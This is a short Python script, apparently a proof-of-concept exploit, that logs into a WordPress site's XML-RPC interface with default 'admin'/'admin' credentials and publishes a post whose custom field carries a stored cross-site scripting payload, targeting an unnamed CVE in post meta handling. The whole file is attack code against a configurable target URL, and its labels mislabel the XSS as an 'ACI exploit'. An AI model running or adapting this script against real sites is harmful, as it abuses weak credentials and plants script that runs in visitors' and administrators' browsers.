import xmlrpc.client

# Setup the connection to the WordPress XML-RPC server
server_url = 'http://example.com/xmlrpc.php'  # Change to the target URL
server = xmlrpc.client.ServerProxy(server_url)

# Malicious payload that exploits the CVE in post meta data handling
payload = "<img src=x onerror=alert(1)>"

try:
    # Attempt to use the XML-RPC API to insert malicious post meta data
    response = server.wp.newPost(1, 'admin', 'admin', {
        'post_title': 'Exploit',
        'post_content': 'Testing CVE',
        'post_status': 'publish',
        'custom_fields': [
            {
                'key': 'extra_info',
                'value': payload
            }
        ]
    })
    if response:
        print('The ACI exploit success!!!')
    else:
        print('The ACI exploit failed!!!')
except Exception as e:
    print('The ACI exploit failed!!!')
    print(str(e))
